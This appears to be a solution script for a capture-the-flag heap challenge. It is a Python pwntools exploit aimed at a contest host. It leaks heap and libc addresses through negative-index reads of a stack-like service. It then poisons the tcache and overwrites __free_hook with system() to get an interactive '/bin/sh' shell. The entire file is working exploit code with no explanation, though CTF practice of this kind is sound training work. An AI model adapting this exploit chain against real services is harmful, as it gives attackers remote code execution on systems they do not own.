#!/usr/bin/python3
from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
# fsb(width, offset, data, padding, roop)
# sop()
# fake_file()

#config
context(os='linux', arch='i386')
#context.log_level = 'debug'

FILE_NAME = "./dist/chall"
#"""
HOST = "pwn.ctf.zer0pts.com"
PORT = 9001
libc = ELF('./dist/libc.so.6')
"""
HOST = "localhost"
PORT = 7777
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#"""

elf = ELF(FILE_NAME)

off_unsorted = libc.symbols["__malloc_hook"]+0x10+0x60
off_system = libc.symbols["system"]
off_free_hook = libc.symbols["__free_hook"]

def push(conn, val):
	conn.sendlineafter(">> ", "1")
	conn.sendlineafter(": ", str(val))

def pop(conn):
	conn.sendlineafter(">> ", "2")

def store(conn, idx, val):
	conn.sendlineafter(">> ", "3")
	conn.sendlineafter(": ", str(idx))
	conn.sendlineafter(": ", str(val))

def load(conn, idx):
	conn.sendlineafter(">> ", "4")
	conn.sendlineafter(": ", str(idx))
	conn.recvuntil(": ")

def wipe(conn):
	conn.sendlineafter(">> ", "5")

def upper32(data):
	return data >> 32

def lower32(data):
	return data & 0xffffffff

def exploit():
	binsh = u64(b"/bin/sh\x00") 

	# leak address part
	while True:
		conn = remote(HOST, PORT)
		#conn = process(FILE_NAME)

		# leak heap address
		for i in range(1, 16):
			push(conn,i)
		
		load(conn,-(0x28//4))
		lower = int(conn.recvline())
		load(conn,-(0x24//4))
		upper = int(conn.recvline())
		heap_base = lower+(upper<<32) - 0x10
		
		print(hex(lower32(heap_base)))
		if lower32(heap_base) > 0x7fffffff:
			# We can't push and store number larger than 0x7fffffff  
			conn.close()
			print("Fail")
			sleep(1)
			continue

		# leak libc address
		for i in range(16,0x220):
			push(conn,i)
			if i % 0x80 == 0:
				print("Try harder")
		load(conn,-(0x810//4))
		lower = int(conn.recvline())
		load(conn,-(0x80c//4))
		upper = int(conn.recvline())
		libc_unsorted = lower+(upper<<32)
		libc_base = libc_unsorted - off_unsorted
		libc_system = libc_base + off_system
		libc_free_hook = libc_base + off_free_hook
		
		print(hex(lower32(libc_base)))
		if lower32(libc_base) > 0x7fffffff:
			# We can't push and store number larger than 0x7fffffff  
			conn.close()
			print("Fail")
			sleep(1)
			continue
		break
	
	# For debug with gdb
	"""
	conn = remote(HOST, PORT)
	
	for i in range(1,0x320):
		push(conn,i)
	load(conn,-(0x810//4))
	lower = int(conn.recvline())
	load(conn,-(0x80c//4))
	upper = int(conn.recvline())
	libc_unsorted = lower+(upper<<32)
	libc_base = libc_unsorted - off_unsorted
	libc_system = libc_base + off_system
	libc_free_hook = libc_base + off_free_hook
	
	load(conn,-((0x810+0x408)//4))
	lower = int(conn.recvline())
	load(conn,-((0x810+0x404)//4))
	upper = int(conn.recvline())
	heap_base = lower+(upper<<32) - 0x10

	print(hex(lower32(libc_base)))
	print(hex(lower32(heap_base)))

	"""

	wipe(conn) # reset 

	# exploit part

	for i in range(7):
		push(conn,0)
	store(conn,-(0x8//4), 0x21) # overwrite size 0x31 -> 0x21
	
	for i in range(7, 16):
		push(conn,0)
	store(conn,6, 0x91) # prepare fake chunk size 
	
	# link fake chunk to tcache (0x31)
	store(conn,-(0x30//4), lower32(heap_base+0x290+0x11c10+0xa0))	
	store(conn,-(0x2c//4), upper32(heap_base+0x290+0x11c10+0xa0))	
	wipe(conn)	
	
	for i in range(16):
		push(conn,0)
	store(conn,6, 0x81) # overwrite size 0x91 -> 0x81
	# fix tcache 0x21
	store(conn,-(0x30//4), lower32(heap_base+0x290+0x11c10+0x10)) 
	store(conn,-(0x2c//4), upper32(heap_base+0x290+0x11c10+0x10))
	# link free_hook-0x18 to tcache (0x91)
	store(conn,8, lower32(libc_free_hook-0x18))
	store(conn,9, upper32(libc_free_hook-0x18))

	push(conn,1)
	wipe(conn)
	for i in range(17):
		push(conn,0)
	store(conn,0, lower32(binsh))
	store(conn,1, upper32(binsh))
	# overwrite free_hook to system()
	store(conn,6, lower32(libc_system))
	store(conn,7, upper32(libc_system))
	wipe(conn)
	
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
